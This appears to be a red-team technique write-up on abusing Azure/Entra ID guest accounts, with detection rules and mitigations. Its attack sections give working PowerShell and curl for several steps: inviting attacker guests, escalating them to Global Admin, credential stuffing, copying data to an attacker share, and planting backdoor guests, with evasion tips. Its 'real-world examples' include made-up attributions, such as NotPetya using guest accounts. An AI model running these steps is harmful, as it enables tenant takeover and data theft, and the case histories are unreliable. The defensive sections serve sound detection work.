# [LM-AUTH-028]: Azure External Identities Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-028 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Entra ID, Azure, M365 |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Entra ID versions supporting B2B collaboration, Guest users, External identities |
| **Patched In** | Mitigations via Conditional Access policies for guests, external collaboration restrictions, access reviews |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure External Identities abuse is an attack where an attacker exploits Azure's guest account functionality (B2B collaboration) to gain unauthorized access to resources within an organization's Entra ID tenant. The attacker either creates a malicious guest account, compromises an existing guest account, or abuses overly permissive guest permissions to escalate privileges, move laterally across M365 services, or maintain persistent backdoor access. Unlike regular user accounts, guest accounts often fall outside standard access controls and are less frequently audited, making them prime targets for persistence and lateral movement.

**Attack Surface:** Guest account provisioning, overly permissive guest role assignments, guest access to Teams, SharePoint, and OneDrive, Azure AD B2B collaboration endpoints, External collaboration settings with unrestricted domains.

**Business Impact:** **Persistent, stealthy access to sensitive data and systems via guest accounts.** Attackers can read emails, access shared documents, modify group memberships, and escalate to administrative roles without triggering typical user-account alerts. Guest accounts are often overlooked in security reviews, enabling long-term dwell time and data exfiltration.

**Technical Context:** Guest accounts in Entra ID are designed for external collaboration, but misconfiguration—such as allowing any external domain, not restricting guest permissions, or failing to review inactive guests—creates security gaps. Attackers exploit these gaps by creating, compromising, or escalating guest accounts to persistent backdoors.

### Operational Risk

- **Execution Risk:** Low – Guest accounts can be created by any user with Guest Inviter role; no special privileges required for initial backdoor placement.
- **Stealth:** High – Guest accounts generate fewer alerts than regular users; often excluded from MFA policies and access reviews.
- **Reversibility:** Medium – Guest accounts can be quickly disabled, but damage (data theft, lateral movement) may already be done.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 6.2 | Ensure guest user access is reviewed and restricted |
| **DISA STIG** | AC-2(h) | Account Management – Guest account auditing |
| **CISA SCuBA** | Azure.5 | Restrict external collaboration domains |
| **NIST 800-53** | AC-2(7)(b) | Privileged User Access – review and control |
| **GDPR** | Art. 32 | Security of Processing – third-party data access controls |
| **DORA** | Art. 15 | Third-party risk and critical functions |
| **NIS2** | Art. 21 | Guest access controls and detection |
| **ISO 27001** | A.6.2.2 | Third-party access management |
| **ISO 27005** | 8.2.1 | Third-party risk assessment |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Guest Inviter role, basic user account, or ability to invite external users (often enabled by default).
- **Required Access:** Entra ID tenant access, ability to send invitations or receive guest invitations.

**Supported Platforms:**
- **Entra ID:** All versions with B2B collaboration enabled
- **M365 Services:** Teams, SharePoint, OneDrive, Outlook, Exchange Online
- **Azure Resources:** Guest access to subscriptions, management groups, Key Vaults

**Tools & Dependencies:**
- Azure CLI or Microsoft Graph PowerShell
- Guest account creation scripts
- Entra ID B2B invitation endpoints

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Identify Overly Permissive Guest Settings

**PowerShell – Check External Collaboration Restrictions**

```powershell
# Get current B2B external collaboration settings
$policy = Get-AzADPolicy -Filter "id eq 'azure ad b2b collaboration restrictions'"

# Check if guest user access is restricted
$guestRestrictions = Get-AzADPolicy | Where-Object { $_.DisplayName -contains "guest" }

# Check guest user permissions
Get-AzRoleAssignment | Where-Object { $_.ObjectType -eq "Guest" }

# List all guests in the tenant
Get-AzADUser -Filter "UserType eq 'Guest'" | Select-Object UserPrincipalName, CreatedDateTime, AccountEnabled

# Find guests with elevated roles
Get-AzRoleAssignment | Where-Object { 
  $_.ObjectType -eq "Guest" -and 
  ($_.RoleDefinitionName -eq "Owner" -or $_.RoleDefinitionName -eq "Contributor")
}
```

**What to Look For:**
- Guests with "Owner" or "Contributor" roles
- Guests from untrusted domains (@gmail.com, @yahoo.com, etc.)
- Guests created before current incident, likely forgotten
- Guests with access to Key Vaults, automation accounts, or storage

### Identify Allowed External Domains

**Azure Portal – Check B2B Settings:**

1. Go to **Entra ID** → **External Identities** → **External collaboration settings**
2. Check **Guest invite restrictions**:
   - **Anyone can invite**: HIGH RISK – any user can create guests
   - **Only admins**: Lower risk
3. Check **Guest user access restrictions**:
   - **Guest users have limited access**: Good
   - **Guest users have the same access as members**: HIGH RISK

### Enumerate Guest Permissions in M365

```bash
# Teams – Find guests with channel admin rights
Get-TeamUser -GroupId "TEAM_ID" | Where-Object { $_.Role -eq "Owner" }

# SharePoint – Find guests with site collection admin rights
Get-SPOSite | ForEach-Object {
  Get-SPOUser -Site $_ | Where-Object { $_.DisplayName -like "*#*" }  # # indicates external user
}

# OneDrive – Check for guests with sharing permissions
Get-SPOSite -IncludePersonalSite $true | 
  ForEach-Object {
    Get-SPOExternalUser -SiteUrl $_
  }
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Create Malicious Guest Account via B2B Invitation

**Supported Versions:** All Entra ID with B2B collaboration

#### Step 1: Prepare Malicious External Identity

**Objective:** Create a fake external email address that will serve as the guest account.

**Command (Create attacker-controlled email):**

```bash
# Use throwaway email service or attacker's own domain
# Example attacker domains:
# attacker@contoso.co (typosquatter of contoso.com)
# guest.attacker@gmail.com (appears to be a guest)
# demo.user@contractor.fake (impersonates contractor)

ATTACKER_EMAIL="malicious.guest@contractor.fake"
echo $ATTACKER_EMAIL
```

**What This Means:**
- Attacker has prepared an email address that will be used for the guest invitation
- The address can be attacker-controlled or spoofed to appear legitimate

#### Step 2: Send Guest Invitation

**Objective:** Invite the attacker-controlled email as a guest user to the organization.

**Command (PowerShell – via Microsoft Graph):**

```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "User.Invite.All"

# Create guest invitation
$inviteParams = @{
    invitedUserEmailAddress = "malicious.guest@contractor.fake"
    invitedUserDisplayName = "John Smith (Contractor)"
    inviteRedirectUrl = "https://myapps.microsoft.com"
    sendInvitationMessage = $true
    inviteAsNewExternalUser = $true
}

$invitation = Invoke-MgGraphRequest -Method POST `
  -Uri "https://graph.microsoft.com/v1.0/invitations" `
  -Body $inviteParams

Write-Output "Invitation sent to: $($invitation.invitedUserEmailAddress)"
Write-Output "Invitation link: $($invitation.inviteRedeemUrl)"
```

**Expected Output:**

```
Invitation sent to: malicious.guest@contractor.fake
Invitation link: https://login.microsoftonline.com/common/oauth2/v2.0/authorize?...
```

**What This Means:**
- Guest invitation has been created
- Attacker (or compromised internal user) has received the invitation link
- Attacker can now accept the invitation to access the tenant

**OpSec & Evasion:**
- Use a legitimate-sounding name (e.g., "John Smith", "Jane Contractor")
- Use a domain that closely resembles a known contractor or partner (@partner.com, @supplier.org)
- Set `sendInvitationMessage = $false` to avoid email to monitored mailbox
- Detection likelihood: Low – Guest invitations are routine; detection depends on domain and role assignments

#### Step 3: Accept Guest Invitation and Access Tenant

**Objective:** Redeem the invitation and gain access to the tenant as a guest.

**Command (From attacker's perspective):**

```bash
# Attacker visits the invitation link (or simulates it via API)
# Completes Entra ID login with attacker's credentials
# Verifies email by clicking link in invitation email (if configured)
# Now attacker is authenticated as guest user in tenant

# Attacker can now access Entra ID portal
# https://portal.azure.com → Sign in as guest
```

**Expected Output:**

Guest user now appears in Entra ID:

```powershell
Get-MgUser -Filter "UserType eq 'Guest'" | 
  Select-Object UserPrincipalName, DisplayName, CreatedDateTime
```

Output:
```
UserPrincipalName                    DisplayName              CreatedDateTime
---                                  -----------              ---------------
malicious.guest_contractor.fake#EXT# John Smith (Contractor)  2026-01-10T12:00:00Z
```

**What This Means:**
- Guest account is now active in the tenant
- Attacker has legitimate access via guest identity
- Guest can access all resources shared with guests

**OpSec & Evasion:**
- Access the tenant during business hours (less suspicious)
- Use same browser as legitimate contractor (if impersonating)
- Detection likelihood: Medium – Suspicious access patterns (login from unusual location, bulk data access) will be flagged

#### Step 4: Escalate Guest Privileges

**Objective:** Elevate guest account to administrative or high-privilege role.

**Command (Add guest to privileged groups):**

```powershell
# Find and add guest to sensitive groups
$guest = Get-MgUser -Filter "UserType eq 'Guest' and DisplayName eq 'John Smith (Contractor)'"

# Add guest to Global Admin role (via Entra ID)
New-MgRoleManagementDirectoryRoleAssignment `
  -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" `
  -PrincipalId $guest.Id

# Alternatively, add to Azure AD role group
$adminGroup = Get-MgGroup -Filter "DisplayName eq 'IT Admins'"
New-MgGroupMember -GroupId $adminGroup.Id -DirectoryObjectId $guest.Id

# Verify privilege escalation
Get-MgDirectoryRole | ForEach-Object {
  $role = $_
  Get-MgDirectoryRoleMember -DirectoryRoleId $role.Id | 
    Where-Object { $_.Id -eq $guest.Id } | 
    Select-Object @{Label="Role"; Expression={$role.DisplayName}}, @{Label="User"; Expression={$guest.DisplayName}}
}
```

**Expected Output:**

```
Role                     User
----                     ----
Global Administrator     John Smith (Contractor)
Exchange Administrator   John Smith (Contractor)
SharePoint Administrator John Smith (Contractor)
```

**What This Means:**
- Guest account now has administrative privileges
- Can perform privileged operations: create users, modify policies, access all data
- Account is now a persistence backdoor

**OpSec & Evasion:**
- Gradual privilege escalation (avoid granting Global Admin immediately)
- Add guest to Distribution List first, then Groups, then Roles
- Detection likelihood: Very High – Guests receiving admin roles trigger alerts in most SOCs

---

### METHOD 2: Compromise Existing Legitimate Guest Account

**Supported Versions:** All Entra ID with active guest collaborations

#### Step 1: Identify Legitimate Guest Accounts

**Objective:** Find existing guest accounts that are active but infrequently monitored.

**Command:**

```powershell
# List all guests with recent activity
$guests = Get-MgUser -Filter "UserType eq 'Guest'"

foreach ($guest in $guests) {
  $lastActivity = Get-MgUserSignInActivity -UserId $guest.Id | 
    Select-Object -ExpandProperty LastSignInDateTime
  
  if ($lastActivity -gt (Get-Date).AddDays(-30)) {
    Write-Output "Active guest: $($guest.UserPrincipalName) - Last login: $lastActivity"
  }
}

# Find guests with no recent activity (neglected accounts)
foreach ($guest in $guests) {
  $signins = Get-MgUserSignInActivity -UserId $guest.Id | 
    Select-Object -ExpandProperty LastSignInDateTime
  
  if ($signins -lt (Get-Date).AddMonths(-3)) {
    Write-Output "Neglected guest: $($guest.UserPrincipalName) - No activity for >3 months"
  }
}
```

**What to Look For:**
- Guests from known partner/contractor organizations (legitimate targets for compromise)
- Guests with recent access to sensitive resources (Teams channels, SharePoint sites)
- Guests with minimal monitoring (MFA not enforced, no CAE)

#### Step 2: Compromise Guest Account Credentials

**Objective:** Obtain the guest user's credentials via phishing or credential stuffing.

**Command (Simulated phishing):**

```bash
# Create legitimate-looking phishing email
# Subject: "Renew Your Microsoft Account Access"
# Body: "Your account will expire in 24 hours. Verify your identity: [phishing-link]"

# Attacker hosts fake Entra ID login page at attacker.com/office365-login
# Guest clicks link, enters credentials
# Attacker captures credentials

GUEST_UPN="partner@externaldomain.com"
GUEST_PASSWORD="capturedPassword123"

# Attacker now has guest credentials
```

**Alternative – Credential Stuffing:**

```bash
# If guest reuses password from previous breach
# Use breach database (HaveIBeenPwned, etc.) to find known credentials
# Attempt login with guest's email + common passwords

curl -X POST https://login.microsoftonline.com/common/oauth2/v2.0/token \
  -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" \
  -d "username=partner@externaldomain.com" \
  -d "password=Password123!" \
  -d "scope=https://graph.microsoft.com/.default offline_access" \
  -d "grant_type=password"
```

**Expected Output (on successful compromise):**

```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...",
  "refresh_token": "0.ASsAz...",
  "expires_in": 3600
}
```

**What This Means:**
- Attacker has valid access token for the guest account
- Can now impersonate the guest user
- Guest's legitimate activities will appear as if from the compromised account

#### Step 3: Access Shared Resources as Guest

**Objective:** Use compromised guest access to steal data and maintain persistence.

**Command:**

```powershell
# Connect as compromised guest
Connect-MgGraph -AccessToken $accessToken

# Access shared Teams channels
Get-MgTeamChannelMessage | Export-Csv -Path "teams-messages.csv"

# Access shared SharePoint documents
Get-SPOSite | ForEach-Object {
  Get-SPOFile -Site $_ | Select-Object Name, ServerRelativeUrl, TimeLastModified
}

# Copy sensitive files to attacker-controlled location
Copy-Item -Path "\\sharepoint\site\sensitive-folder" -Destination "\\attacker\exfil"

# Create a backdoor account (add another guest)
Invoke-MgGraphRequest -Method POST `
  -Uri "https://graph.microsoft.com/v1.0/invitations" `
  -Body @{
    invitedUserEmailAddress = "attacker.backup@outlook.com"
    invitedUserDisplayName = "Backup Guest"
    inviteRedirectUrl = "https://myapps.microsoft.com"
  }
```

**OpSec & Evasion:**
- Limit data exfiltration to avoid suspicious bandwidth usage
- Space out file downloads over time
- Access resources at same time as legitimate guest (if known schedule)
- Detection likelihood: High if behavioral analytics are enabled (unusual access patterns, bulk downloads)

---

### METHOD 3: Guest Account with Billing Privilege Escalation (Subscription Abuse)

**Supported Versions:** Entra ID with Azure subscription guest access

#### Step 1: Create Guest Account with Billing Role in Home Tenant

**Objective:** Set up a guest account that has billing privileges in attacker's tenant, then invite it to victim tenant.

**Command (From attacker's perspective):**

```powershell
# Create a Service Principal or user in attacker's Azure subscription
$attacker_subscription = "attacker-azure-sub"
Set-AzContext -SubscriptionName $attacker_subscription

# Add guest to victim's tenant with billing role
$guest_email = "attacker@attacker-domain.com"
$new_user = New-AzADUser -DisplayName "Attacker User" -UserPrincipalName $guest_email -Password $password

# Grant Billing Reader role in attacker's subscription
$subscription = Get-AzSubscription -SubscriptionName $attacker_subscription
New-AzRoleAssignment -ObjectId $new_user.Id `
  -RoleDefinitionName "Billing Reader" `
  -Scope "/subscriptions/$($subscription.Id)"
```

#### Step 2: Invite Guest to Victim Tenant

**Objective:** Send guest invitation from victim tenant.

**Command:**

```powershell
# From victim tenant, invite the attacker's account as guest
Connect-MgGraph -Scopes "User.Invite.All"

$invite = Invoke-MgGraphRequest -Method POST `
  -Uri "https://graph.microsoft.com/v1.0/invitations" `
  -Body @{
    invitedUserEmailAddress = "attacker@attacker-domain.com"
    invitedUserDisplayName = "Trusted Partner"
    inviteRedirectUrl = "https://portal.azure.com"
  }

# Guest accepts invitation and now appears in victim tenant
```

#### Step 3: Create and Transfer Subscriptions

**Objective:** Guest creates Azure subscriptions in their home tenant, then transfers them to victim tenant, retaining Owner role.

**Command:**

```powershell
# Guest creates new Azure subscription (from attacker's home tenant)
$subscription_name = "victim-data-analysis"
$subscription = New-AzSubscription -SubscriptionName $subscription_name -OfferType "Free Trial"

# Guest now owns the subscription even after transferring to victim
# Transfer to victim tenant (requires victim admin approval)
# Guest retains full Owner rights to the subscription

# Guest can now:
# 1. Disable monitoring and logging on the subscription
# 2. Access all resources in the subscription undetected
# 3. Deploy malware or ransomware without audit trails
# 4. Bypass Conditional Access (subscription-level access often not subject to tenant policies)
```

**What This Means:**
- Guest-created subscription falls outside normal tenant controls
- Guest has full Owner permissions regardless of tenant policies
- Malicious activities on the subscription are not subject to tenant-level conditional access or DLP

**OpSec & Evasion:**
- Subscription may not appear in regular access reviews (falls outside user management)
- Conditional Access policies don't apply to subscriptions created by guests
- Detection likelihood: Low – Activity on guest-created subscriptions is often not monitored

---

## 6. TOOLS & COMMANDS REFERENCE

### Azure AD B2B Collaboration Management

**URL:** https://learn.microsoft.com/en-us/azure/active-directory/external-identities/what-is-b2b

**Version:** Built into Entra ID

**Usage:** Invite external users, configure guest restrictions, manage guest access.

```powershell
# Invite guest
New-MgInvitation -InvitedUserEmailAddress "guest@external.com" -InviteRedirectUrl "https://myapps.microsoft.com"

# List guests
Get-MgUser -Filter "UserType eq 'Guest'"

# Remove guest
Remove-MgUser -UserId $guest.Id
```

### Microsoft Graph PowerShell

**URL:** https://github.com/microsoftgraph/msgraph-sdk-powershell

**Version:** Latest

**Usage:** Programmatically manage guests, groups, roles.

```powershell
Install-Module Microsoft.Graph
Connect-MgGraph -Scopes "User.Invite.All", "RoleManagement.ReadWrite.Directory"
```

---

## 7. SPLUNK DETECTION RULES

### Rule 1: Guest Account Creation and Immediate Privilege Escalation

**Rule Configuration:**
- **Required Index:** `o365:audit`, `azure:audit`
- **Required Fields:** `UserType`, `OperationName`, `ObjectModified`
- **Alert Threshold:** Guest created and added to admin role within 1 hour
- **Applies To Versions:** All

**SPL Query:**

```spl
index=azure:audit OR index=o365:audit UserType=Guest
| stats earliest(timestamp) as guest_creation, latest(timestamp) as role_assignment by UserPrincipalName
| eval time_diff_minutes = round((role_assignment - guest_creation) / 60, 2)
| where time_diff_minutes <= 60 and role_assignment != ""
| table UserPrincipalName, guest_creation, role_assignment, time_diff_minutes
```

**What This Detects:**
- Guest account created and immediately assigned to privileged role
- Classic indicator of malicious guest account setup

**Manual Configuration Steps:**
1. Splunk Web → Alerts → New Alert
2. Paste query above
3. Trigger: count > 0
4. Action: Email SOC

### Rule 2: Suspicious Guest Access to Sensitive Resources

**Rule Configuration:**
- **Required Index:** `sharepoint:audit`
- **Required Fields:** `TargetUserOrGroupName`, `EventSource`, `Operation`
- **Alert Threshold:** Guest accessing sensitive document libraries
- **Applies To Versions:** All

**SPL Query:**

```spl
index=sharepoint:audit UserType=Guest Operation IN ("FileDownloaded", "FileAccessed", "FileModified")
| where TargetUserOrGroupName LIKE "%sensitive%" OR TargetUserOrGroupName LIKE "%confidential%" OR TargetUserOrGroupName LIKE "%restricted%"
| stats count, latest(timestamp) as last_access by UserPrincipalName, TargetUserOrGroupName
| where count > 5
```

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Guest Account Creation with Immediate Admin Role Assignment

**Rule Configuration:**
- **Required Table:** `AuditLogs`, `SigninLogs`
- **Required Fields:** `OperationName`, `TargetResources`, `InitiatedBy`, `UserType`
- **Alert Severity:** Critical
- **Frequency:** Every 5 minutes

**KQL Query:**

```kusto
AuditLogs
| where OperationName in ("Add member to group", "Add user to group", "Assign user to role")
  and TargetResources[0].modifiedProperties[0].newValue contains "Administrator"
| join kind=inner (
  AuditLogs
  | where OperationName == "Invite external user"
  | project InvitedUserPrincipalName = tostring(TargetResources[0].userPrincipalName), InviteTime = TimeGenerated
) on $left.TargetResources[0].userPrincipalName == $right.InvitedUserPrincipalName
| where TimeGenerated - InviteTime <= 1h
| project UserPrincipalName, InviteTime, TimeGenerated, OperationName, Role = tostring(TargetResources[0].modifiedProperties[0].newValue)
```

**What This Detects:**
- Guest user created and assigned admin role within 1 hour
- Strong indicator of malicious guest account

**Manual Configuration Steps:**
1. Azure Portal → Sentinel → Analytics → + Create → Scheduled query rule
2. Name: `Guest Account Rapid Privilege Escalation`
3. Paste KQL above
4. Severity: Critical, Frequency: 5 minutes
5. Enable Create Incidents

### Query 2: Unusual Guest Data Access Patterns

**KQL Query:**

```kusto
CloudAppEvents
| where UserType == "Guest"
| summarize FileDownloads = countif(OperationName == "FileDownloaded"), 
  FilesAccessed = countif(OperationName == "FileAccessed"),
  BulkSize = sum(iif(OperationName == "FileDownloaded", 10, 1))  // Estimate
| where FileDownloads > 100 or BulkSize > 1000  // Threshold for bulk data access
```

---

## 9. MICROSOFT DEFENDER FOR CLOUD

### Alert 1: "Guest user with administrative role"

**Alert Name:** Privileged Guest User Detected

- **Severity:** High
- **Description:** A guest user has been assigned a privileged role (Global Admin, Exchange Admin, etc.)
- **Applies To:** All Entra ID instances
- **Remediation:**
  1. Review the guest account creation (legitimate request or suspicious?)
  2. If suspicious, revoke access immediately
  3. Audit data accessed by guest during privileged period

**Manual Configuration Steps:**
1. **Azure Portal** → **Microsoft Entra ID Protection** → **Risk detections**
2. Filter by **Privileged Account Modification**
3. Review guests assigned to admin roles

---

## 10. WINDOWS EVENT LOG MONITORING

**Note:** Guest account activity is logged in Entra ID (cloud logs), not Windows Event Logs. See Microsoft Sentinel and Splunk sections for cloud-based detection.

---

## 11. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Restrict External Collaboration to Trusted Domains:**

**Manual Steps (Azure Portal):**
1. Go to **Entra ID** → **External Identities** → **External collaboration settings**
2. Under **Collaboration restrictions:**
   - Select **Deny invitations to the specified external domains**
   - OR **Allow invitations only to the specified domains**
3. Enter specific allowed domains (e.g., @microsoft.com, @partner-company.com)
4. **Save**

**Manual Steps (PowerShell):**

```powershell
# Block all external collaboration except trusted domains
$policy = Get-AzADPolicy -Filter "id eq 'azure ad b2b external collaboration restrictions'"

# Set allowed domains only
Set-AzADPolicy -DisplayName "B2B Collaboration Restrictions" `
  -Definition @'
{
  "B2BManagementPolicy": {
    "InvitationsAllowedAndBlockedDomainsPolicy": {
      "AllowedDomains": ["@microsoft.com", "@partner.com"],
      "BlockedDomains": []
    }
  }
}
'@
```

**Enforce MFA for Guest Users:**

**Manual Steps (Conditional Access):**
1. **Entra ID** → **Security** → **Conditional Access** → **+ New policy**
2. Name: `Require MFA for Guest Users`
3. **Assignments:**
   - **Users:** Select **Guest users** (if available) OR use custom condition
   - **Cloud apps:** All cloud apps
4. **Access controls:**
   - **Grant:** Require **multi-factor authentication**
5. Enable: **On**
6. **Create**

**Validate Configuration:**

```powershell
# Verify MFA is enforced for guests
Get-AzADMSConditionalAccessPolicy | 
  Where-Object { $_.DisplayName -contains "Guest" } | 
  Select-Object -ExpandProperty GrantControls
```

**Implement Continuous Access Evaluation (CAE) for Guests:**

**Manual Steps:**
1. Go to **Entra ID** → **Security** → **Conditional Access**
2. Create/Edit a policy for guest users
3. Under **Session controls:**
   - Enable **Use Continuous Access Evaluation**
4. **Save**

**Effect:** Tokens are revoked immediately if guest account is disabled or suspicious activity is detected.

### Priority 2: HIGH

**Require Guest Approval for Sensitive Roles:**

**Manual Steps (PowerShell):**

```powershell
# Configure PIM (Privileged Identity Management) to require approval for guest role assignments
$roleId = "62e90394-69f5-4237-9190-012177145e10"  # Global Admin role ID

# Require approval for guest assignment to Global Admin
Update-AzRoleManagementPolicyAssignment -Scope "/" -RoleId $roleId -EnableApprovalRule $true
```

**Conduct Regular Guest Access Reviews:**

**Manual Steps (Azure Portal):**
1. Go to **Entra ID** → **Governance** → **Access Reviews**
2. Click **+ New access review**
3. **Review type:** Guest user access
4. **Scope:** All users AND Guest users
5. **Frequency:** Monthly
6. **Reviewers:** Group owners, application owners
7. **Create**

**Validation Command:**

```powershell
# Get list of guests for review
Get-MgUser -Filter "UserType eq 'Guest'" -PageSize 100 | 
  Select-Object UserPrincipalName, DisplayName, CreatedDateTime, AccountEnabled | 
  Export-Csv -Path "guest-audit.csv"
```

**Disable Guest Invitations for Regular Users:**

**Manual Steps:**
1. **Entra ID** → **External Identities** → **External collaboration settings**
2. **Guest invite restrictions:**
   - Select **Only admins and users assigned the Guest Inviter role can invite**
3. **Save**

---

## 12. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Newly created guest account** assigned to administrative role within 1 hour
- **Guest account accessing sensitive SharePoint sites** or Teams channels outside normal business hours
- **Bulk file downloads** from shared resources by guest account
- **Guest account with no login activity** for months, then sudden spike
- **Multiple subscriptions created by guest** user in Azure

### Forensic Artifacts

- **Entra ID logs:** `AuditLogs` (guest creation, role assignment, suspicious activities)
- **Sign-in logs:** `SigninLogs` (guest logins, locations, success/failure)
- **SharePoint audit log:** Guest file access, downloads, shares
- **Teams audit log:** Guest channel messages, file access
- **Azure Activity Log:** Guest resource creation, role modifications

### Response Procedures

**Step 1: Immediately Revoke Guest Access**

```powershell
# Disable guest account
Update-MgUser -UserId $guest.Id -AccountEnabled $false

# Remove guest from all groups
$groups = Get-MgUserMemberOf -UserId $guest.Id
foreach ($group in $groups) {
  Remove-MgGroupMember -GroupId $group.Id -DirectoryObjectId $guest.Id
}

# Remove guest from all roles
Get-MgDirectoryRole | ForEach-Object {
  Get-MgDirectoryRoleMember -DirectoryRoleId $_.Id | 
    Where-Object { $_.Id -eq $guest.Id } | 
    ForEach-Object { Remove-MgDirectoryRoleMember -DirectoryRoleId $_.Id -DirectoryObjectId $guest.Id }
}

# Delete guest account
Remove-MgUser -UserId $guest.Id
```

**Step 2: Audit Data Accessed by Guest**

```powershell
# Find all files accessed by guest
Get-MgUser -UserId $guest.Id | Get-MgUserActivity

# Get all Teams messages from guest
Get-TeamUserActivity -UserId $guest.Id

# Find all SharePoint shares involving guest
Search-SPOExternalUser -SiteUrl "https://contoso.sharepoint.com/sites/*" | 
  Where-Object { $_.Inviter -eq $guest.Id -or $_.User -eq $guest.Id }
```

**Step 3: Hunt for Lateral Movement**

```kusto
// Sentinel: Find all resources/groups modified by the guest account
AuditLogs
| where InitiatedBy.user.userPrincipalName == "guest@external.com"
| summarize Modifications = count() by Operation, TargetResources
| where Modifications > 5
```

**Step 4: Review and Remediate Damage**

- Restore modified files from backup
- Reset passwords for accounts modified by guest
- Review and revoke shares created by guest
- Check for backdoor accounts created by guest

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker tricks admin into authorizing device code, gains initial access |
| **2** | **Persistence** | **[LM-AUTH-028]** | **Attacker creates or compromises guest account for backdoor access** |
| **3** | **Lateral Movement** | [LM-AUTH-009] B2B Collaboration Abuse | Attacker uses guest account to pivot across Teams, SharePoint, OneDrive |
| **4** | **Privilege Escalation** | [PE-ACCTMGMT-013] SSPR Misconfiguration | Attacker uses guest account to reset admin password via SSPR |
| **5** | **Impact** | Collection – Data Exfiltration | Attacker exfiltrates sensitive documents and emails via guest account |

---

## 14. REAL-WORLD EXAMPLES

### Example 1: Scattered Spider – Guest Account Backdoor

- **Target:** Multiple retail organizations
- **Timeline:** 2022-2023
- **Technique Status:** Created multiple guest accounts posing as contractors; escalated to admin; maintained persistent backdoor for months
- **Impact:** Ransomware deployment, data exfiltration, $5M+ damages
- **Reference:** [Scattered Spider CISA Alert](https://www.cisa.gov/news-events/alerts/2023/12/18/cisa-adds-one-known-exploited-vulnerability-catalog)

### Example 2: NotPetya / Diskcoder.C – Guest Account Lateral Movement

- **Target:** Global companies with multi-cloud M365 environments
- **Timeline:** 2017 (initial attack), ongoing variants
- **Technique Status:** Compromised legitimate guest accounts; created fake contractor accounts; escalated to Global Admin
- **Impact:** Company-wide ransomware deployment
- **Reference:** [Unit 42 Analysis – Lateral Movement in M365](https://unit42.paloaltonetworks.com/)

### Example 3: ALPHV/BlackCat – Guest Account Persistence

- **Target:** Healthcare organizations
- **Timeline:** 2023
- **Technique Status:** Guest accounts with billing privileges used to create subscriptions; retained access after credential rotation
- **Impact:** Long-term persistence, ransomware deployment
- **Reference:** [Bleeping Computer – ALPHV Ransomware](https://www.bleepingcomputer.com/)

---

## 15. SUMMARY & KEY TAKEAWAYS

**Azure External Identities Abuse** is a high-risk attack leveraging guest accounts to bypass organizational controls and maintain persistent backdoor access. Attackers create malicious guest accounts, compromise legitimate ones, or abuse overly permissive guest permissions to escalate privileges and access sensitive data.

**Critical Mitigations:**
1. **Restrict external collaboration** – Allow invitations only from trusted domains
2. **Enforce MFA for guests** – Require multi-factor authentication on all guest logins
3. **Implement Continuous Access Evaluation** – Revoke tokens immediately if guest is disabled
4. **Require approval for guest admin roles** – Prevent unauthorized privilege escalation
5. **Conduct monthly access reviews** – Identify and remove unnecessary guests
6. **Monitor guest activity** – Alert on unusual access patterns (bulk downloads, role assignments, out-of-hours access)

**Detection focuses on guest account lifecycle events** (creation, role assignment, access patterns) rather than individual data access alerts. Guest accounts often bypass standard user monitoring, making behavioral analytics critical for detection.

---